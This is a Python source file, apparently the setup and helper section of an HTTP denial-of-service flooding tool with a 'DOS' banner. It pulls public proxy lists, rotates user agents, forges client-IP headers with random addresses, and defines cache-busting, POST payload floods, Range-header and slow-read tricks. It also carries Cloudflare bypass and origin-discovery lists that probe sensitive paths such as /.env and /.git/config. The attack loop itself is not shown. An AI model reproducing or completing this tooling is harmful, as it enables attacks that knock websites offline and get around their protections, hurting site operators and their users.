import sys
import os
import ssl
import io
import time
import random
import socket
import asyncio
import aiohttp
import threading
import base64
import json
import msvcrt
import argparse
import configparser
import uuid
import hashlib
from collections import deque
from urllib.parse import urlparse, urljoin, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import h2
    H2_AVAILABLE = True
except ImportError:
    H2_AVAILABLE = False

try:
    import aiohttp_socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False

try:
    from curl_cffi.requests import AsyncSession as CurlAsyncSession
    CURL_CFFI_AVAILABLE = True
except ImportError:
    CURL_CFFI_AVAILABLE = False

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
    "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
    "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP.txt",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=https",
    "https://api.openproxylist.xyz/http.txt",
    "https://api.openproxylist.xyz/https.txt",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/https.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/yemixzy/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/https.txt",
    "https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/proxies.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/http.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/http.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/https.txt",
    "https://proxyspace.pro/http.txt",
    "https://proxyspace.pro/https.txt",
    "https://sunny9577.github.io/proxy-scraper/proxies.txt",
    "https://www.proxy-list.download/api/v1/get?type=https&anon=elite",
    "https://www.proxy-list.download/api/v1/get?type=http&anon=elite",
    "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=ipport&format=text&timeout=20000",
    "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=https&proxy_format=ipport&format=text&timeout=20000",
]

PROXY_CACHE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxy_cache.txt")
ERROR_LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "error_log.txt")
VALIDATION_TIMEOUT = 3.0
MAX_PROXY_LATENCY = 2.5
MIN_PROXY_POOL = 20

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 OPR/115.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 OPR/116.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/25.3 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 16033.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS aarch64 16074.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 19_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/139.0.0.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/140.0.0.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 26_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/139.0.0.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 26_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 26_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.7258.113 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; SM-A556B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; SM-F946B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; CPH2651) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2581) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; 2311DRK48G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; HarmonyOS; ALN-AL80) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; SM-X816B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-X710) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/28.0 Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/27.0 Chrome/138.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Android 15; Mobile; rv:139.0) Gecko/139.0 Firefox/139.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:138.0) Gecko/138.0 Firefox/138.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/140.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (SMART-TV; Linux; Tizen 8.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.0 TV Safari/537.36",
    "Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 WebAppManager",
    "Mozilla/5.0 (PlayStation 5; CPU 4.00GHz) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (Xbox Series X; Xbox;rv:130.0) Gecko/20100101 Firefox/130.0",
    "Mozilla/5.0 (Linux; Android 11; KFTRPWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/130.0.0.0 Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/24.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/27.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 27_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/27.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 16; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 16; Pixel 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 16; Pixel 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; SM-S938U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 16; CPH2699) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; 2412DPN0C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15.6; rv:142.0) Gecko/20100101 Firefox/142.0",
    "Mozilla/5.0 (Android 16; Mobile; rv:141.0) Gecko/141.0 Firefox/141.0",
    "Mozilla/5.0 (Linux; Android 15; SM-X916B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 27_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/27.0 Mobile/15E148 Safari/604.1",
]

PRIMARY_PATHS = ["/", "/robots.txt", "/sitemap.xml", "/favicon.ico",
                 "/index.html", "/index.php", "/home", "/main", "/default"]
SECONDARY_PATHS = ["/about", "/contact", "/login", "/signup", "/register",
                   "/api/v1/users", "/api/v2/status", "/api/health", "/api/v1/test",
                   "/api/v1/", "/api/v2/", "/api/users", "/api/products", "/api/items",
                   "/cart", "/checkout", "/search", "/upload", "/feed", "/rss"]
FUZZ_PATHS = ["/graphql", "/wp-admin/", "/wp-login.php", "/wp-json/wp/v2/users",
              "/admin/", "/search?q={}", "/dashboard", "/panel", "/console",
              "/.env", "/.git/config", "/.well-known/security.txt", "/.dockerenv",
              "/wp-content/plugins/", "/wp-content/themes/",
              "/server-status", "/phpinfo.php", "/info.php", "/xdebuginfo",
              "/api/v3/auth", "/oauth/token", "/cpanel", "/webmail", "/whm",
              "/api/orders", "/api/graphql", "/api/v1/graphql", "/api/v2/graphql",
              "/ws", "/websocket", "/socket.io/", "/signalr", "/sockjs-node",
              "/api/messages", "/api/notifications", "/api/events", "/api/feed",
              "/api/v1/upload", "/api/v2/upload", "/upload", "/files", "/assets",
              "/api/v1/login", "/api/v1/register", "/api/v1/forgot-password"]
WEBSOCKET_PATHS = ["/ws", "/websocket", "/socket.io/", "/signalr", "/ws/chat", "/ws/data"]

HTTP_METHODS = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "PATCH", "DELETE"]

POST_CONTENT_TYPES = [
    "application/x-www-form-urlencoded",
    "application/json",
    "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
    "text/xml",
    "application/xml",
    "application/graphql",
    "text/plain",
]

CACHE_BUST_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789"

RANGE_HEADER_TEMPLATES = [
    "bytes=0-{n}",
    "bytes=0-1,{n}-{n2}",
    "bytes=0-{n},-{n2}",
    "bytes={n}-{n2},-{n3}",
]

TRANSFER_ENCODINGS = ["chunked", "identity", ""]

ACCEPT_ENCODING_BOMB = [
    "gzip, deflate, br, zstd, lz4, xz",
    "br, gzip, deflate",
    "zstd, gzip, deflate, br",
    "gzip, deflate",
    "identity",
]

PORTS_TO_SCAN = [21,22,25,53,80,110,143,443,465,587,993,995,1433,1521,3306,3389,5432,5800,5900,6379,8080,8443,8888,9090,27017]
CF_SUBS = ["direct","origin","direct-connect","cpanel","webmail","mail","ftp","dev","staging","api","www","cdn","gateway","admin","webmail","server","ns1","ns2","dns","smtp","imap","pop","vpn","remote","secure","ssl","test","beta","old","new","backup","bck","internal","lan","local","direct-origin","origin-server","backend","app","service","node","cluster"]

CF_BYPASS_PATHS = [
    "/cdn-cgi/trace",
    "/cdn-cgi/generate_chal",
    "/cdn-cgi/challenge",
    "/cdn-cgi/trace",
    "/__cf_chl_js_tk__",
    "/cdn-cgi/cf_chl_opt",
    "/cdn-cgi/login",
    "/.well-known/security.txt",
    "/robots.txt",
    "/sitemap.xml",
    "/api/health",
    "/api/v1/status",
    "/health",
    "/status",
    "/ping",
    "/alive",
    "/_health",
    "/healthz",
    "/readyz",
    "/.env",
    "/.git/config",
    "/server-status",
    "/nginx-status",
    "/phpinfo.php",
    "/info.php",
    "/.well-known/openid-configuration",
    "/wp-json/",
    "/wp-json/wp/v2/",
    "/graphql",
    "/api/graphql",
    "/api/v2/",
    "/api/v3/",
    "/swagger.json",
    "/openapi.json",
    "/api-docs",
    "/actuator",
    "/actuator/health",
    "/actuator/env",
    "/actuator/info",
    "/actuator/metrics",
    "/metrics",
    "/debug",
    "/debug/pprof",
    "/debug/vars",
    "/_debug",
    "/admin/health",
    "/admin/status",
    "/internal/health",
    "/internal/status",
    "/_status",
    "/_status/healthz",
]

CF_COOKIE_NAMES = [
    "__cf_bm", "cf_clearance", "__cfduid", "__cf_chl_tk",
    "__cf_chl_rt_tk", "cf_chl_rc_bv", "cf_use_ob",
    "cf_use_ob2", "__cf_chl_opt_tk",
]

CF_BYPASS_HEADERS = [
    "CF-Connecting-IP", "CF-Connecting-IPv6", "True-Client-IP",
    "X-Forwarded-For", "X-Real-IP", "CF-IPCountry",
    "CF-RAY", "CF-Visitor", "CF-Worker",
    "CF-Device-ID", "CF-Chl-Bypass",
]
SUBDOMAIN_COMMON = ["www","mail","ftp","dev","staging","api","admin","blog","shop","cdn","m","mobile","app","dashboard","panel","cpanel","webmail","vpn","ns1","ns2","dns","gateway","portal","test","support","status","monitor","metrics","logs","docs","help","kb","wiki","assets","static","media","img","images","files","download","secure","ssl","auth","sso","login","account","billing","cloud","host","server","remote"]

TECH_SIGNATURES = {
    "Cloudflare":["cf-ray","__cfduid","cf-cache-status","cloudflare"],
    "CloudFront":["x-amz-cf-id","x-amz-cf-pop"],
    "Akamai":["x-akamai-transformed"],
    "Fastly":["x-served-by","x-cache-hits"],
    "Nginx":["server: nginx"],
    "Apache":["server: apache"],
    "IIS":["server: microsoft-iis"],
    "PHP":["x-powered-by: php"],
    "Node.js":["x-powered-by: express"],
    "WordPress":["wp-json","wp-content"],
}

running = True
stopped = False
lock = threading.Lock()
total_sent = 0
total_failed = 0
total_success = 0
last_http_code = 0
last_code_label = ""
req_rate = 0.0
rate_times = deque(maxlen=400)
proxy_pool = []
proxy_alive = 0
proxy_index = 0
proxy_lock = threading.Lock()
bypass_active = False
proxy_mode = False
known_good_paths = []
total_proxy_used = 0
total_direct_used = 0
proxy_validate_done = threading.Event()
proxy_validate_result = []

boost_mode = False
multi_method = False
post_bomb = False
slow_read = False
adaptive_scaling = False
payload_size = 1024
session_count = 1
peak_rps = 0.0
total_post_sent = 0
total_get_sent = 0
total_head_sent = 0
total_429 = 0
total_503 = 0
adaptive_cooldown = False

# Latency and success rate tracking
latency_times = deque(maxlen=200)
total_bytes_sent = 0
total_bytes_recv = 0

cf_kill = False
origin_ips = []
direct_origin = False
cf_cookies = {}
cf_origin_found = 0
cf_bypass_count = 0
cf_challenge_solved = 0
cf_subdomains_found = 0
cf_origin_target = None
connection_errors = 0

# 1000x upgrade config globals
force_close_conns = False
use_curl_cffi = CURL_CFFI_AVAILABLE
use_http2 = False
enable_websocket = False
dns_over_https = False
config_file = None
command_line_args = None

def gen_ip():
    r = random.randint
    return f"{r(1,223)}.{r(0,255)}.{r(0,255)}.{r(1,254)}"

class ProxyManager:
    def __init__(self):
        self.proxies = {}
        self.order = []
        self.index = 0
        self.lock = threading.Lock()

    def load(self, proxy_list):
        with self.lock:
            for p in proxy_list:
                clean = p.replace("http://", "").replace("https://", "").strip()
                if clean and clean not in self.proxies:
                    self.proxies[clean] = {"score": 100, "fails": 0, "latency": 1.0, "last_used": 0}
                    self.order.append(clean)

    def next(self, prefer_fast=False):
        with self.lock:
            if not self.order:
                return None
            if prefer_fast and len(self.order) > 10:
                candidates = [p for p in self.order if self.proxies[p]["score"] > 50]
                if candidates:
                    candidates.sort(key=lambda p: self.proxies[p]["latency"])
                    p = candidates[0]
                    self.proxies[p]["last_used"] = time.time()
                    return f"http://{p}"
            for _ in range(len(self.order)):
                p = self.order[self.index % len(self.order)]
                self.index = (self.index + 1) % len(self.order)
                if self.proxies[p]["score"] > 0:
                    self.proxies[p]["last_used"] = time.time()
                    return f"http://{p}"
            return None

    def report(self, proxy_str, success, latency=0.0):
        clean = proxy_str.replace("http://", "").replace("https://", "").strip()
        with self.lock:
            if clean not in self.proxies:
                return
            info = self.proxies[clean]
            if success:
                info["fails"] = max(0, info["fails"] - 1)
                info["score"] = min(200, info["score"] + 5)
                if latency > 0:
                    info["latency"] = info["latency"] * 0.8 + latency * 0.2
            else:
                info["fails"] += 1
                info["score"] -= 25
                if info["fails"] >= 3 or info["score"] <= 0:
                    info["score"] = 0
                    if clean in self.order:
                        self.order.remove(clean)
                        self.proxies.pop(clean, None)

proxy_manager = ProxyManager()

def next_proxy():
    if proxy_mode and proxy_manager.order:
        return proxy_manager.next(prefer_fast=boost_mode)
    if not proxy_pool:
        return None
    global proxy_index
    with proxy_lock:
        p = proxy_pool[proxy_index % len(proxy_pool)]
        proxy_index = (proxy_index + 1) % len(proxy_pool)
        return f"http://{p}"

def remove_bad_proxy(proxy_str):
    proxy_manager.report(proxy_str, False, 0.0)
    clean = proxy_str.replace("http://", "").replace("https://", "").strip()
    with proxy_lock:
        if clean in proxy_pool:
            proxy_pool.remove(clean)
            global proxy_alive
            proxy_alive = len(proxy_pool)
            _save_proxy_cache()

def pick_path():
    if post_bomb and random.random() < 0.55:
        return "/"
    if bypass_active and known_good_paths and random.random() < 0.7:
        return random.choice(known_good_paths)
    r = random.random()
    if r < 0.50:
        return "/"
    elif r < 0.70:
        return random.choice(PRIMARY_PATHS)
    elif r < 0.85:
        return random.choice(SECONDARY_PATHS)
    return random.choice(FUZZ_PATHS).replace("{}", str(random.randint(10000, 99999)))

def cache_bust(path):
    sep = "&" if "?" in path else "?"
    token = "".join(random.choices(CACHE_BUST_CHARS, k=8))
    return f"{path}{sep}v={token}&t={int(time.time()*1000)}"

def gen_payload(size=None):
    if size is None:
        size = payload_size
    key = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
    val = base64.b64encode(random.randbytes(max(size, 64))).decode()
    if random.random() > 0.5:
        return f"{key}={val}"
    else:
        return json.dumps({key: val, "data": val[:size//2], "ts": int(time.time()*1000)})

def pick_method():
    if post_bomb:
        return "POST"
    if multi_method:
        weights = [0.55, 0.25, 0.12, 0.03, 0.025, 0.025, 0.00]
        return random.choices(HTTP_METHODS, weights=weights)[0]
    return "GET"

def gen_range_header():
    n = random.randint(100, 99999)
    n2 = n + random.randint(100, 9999)
    n3 = n2 + random.randint(100, 9999)
    return random.choice(RANGE_HEADER_TEMPLATES).format(n=n, n2=n2, n3=n3)

def code_label(code):
    m = {200:"OK",201:"CREATED",301:"MOVED",302:"FOUND",304:"NOT MODIFIED",
         400:"BAD REQ",401:"UNAUTHORIZED",403:"FORBIDDEN",404:"NOT FOUND",
         405:"METHOD NA",429:"RATE LIMITED",500:"SRV ERROR",502:"BAD GATEWAY",
         503:"SERVICE DOWN",504:"GATEWAY TO"}
    return m.get(code, str(code))

def safe_print(*args, **kwargs):
    try:
        print(*args, **kwargs)
    except Exception:
        pass

def log_error(msg):
    try:
        with open(ERROR_LOG_FILE, "a", encoding="utf-8", errors="ignore") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} {msg}\n")
    except Exception:
        pass

def any_key():
    safe_print("\nPress any key to exit...")
    sys.stdout.flush()
    try:
        msvcrt.getch()
    except Exception:
        input()

def prompt_yn(prompt_text):
    safe_print(prompt_text, end="", flush=True)
    while True:
        try:
            ch = msvcrt.getch().lower()
            if ch in (b'y', b'n'):
                safe_print(ch.decode())
                return ch == b'y'
        except Exception:
            return input().strip().lower() == "y"

def show_banner():
    os.system("cls" if os.name == "nt" else "clear")
    safe_print(r"""
  /$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$$$$$$  /$$$$$$$  /$$    /$$       /$$$$$$$   /$$$$$$   /$$$$$$
 /$$__  $$ /$$__  $$| $$  /$$/| $$  | $$| $$__  $$| $$__  $$| $$   | $$      | $$__  $$ /$$__  $$ /$$__  $$
| $$  \ $$| $$  \__/| $$ /$$/ | $$  | $$| $$  \ $$| $$  \ $$| $$   | $$      | $$  \ $$| $$  \ $$| $$  \__/
| $$  | $$|  $$$$$$ | $$$$$/  | $$$$$$$$| $$$$$$$/| $$$$$$$/|  $$ / $$/      | $$  | $$| $$  | $$|  $$$$$$
| $$  | $$ \____  $$| $$  $$  |_____  $$| $$__  $$| $$__  $$ \  $$ $$/       | $$  | $$| $$  | $$ \____  $$
| $$  | $$ /$$  \ $$| $$\  $$       | $$| $$  \ $$| $$  \ $$  \  $$$/        | $$  | $$| $$  | $$ /$$  \ $$
|  $$$$$$/|  $$$$$$/| $$ \  $$      | $$| $$  | $$| $$  | $$   \  $/         | $$$$$$$/|  $$$$$$/|  $$$$$$/
 \______/  \______/ |__/  \__/      |__/|__/  |__/|__/  |__/    \_/          |_______/  \______/  \______/
""")

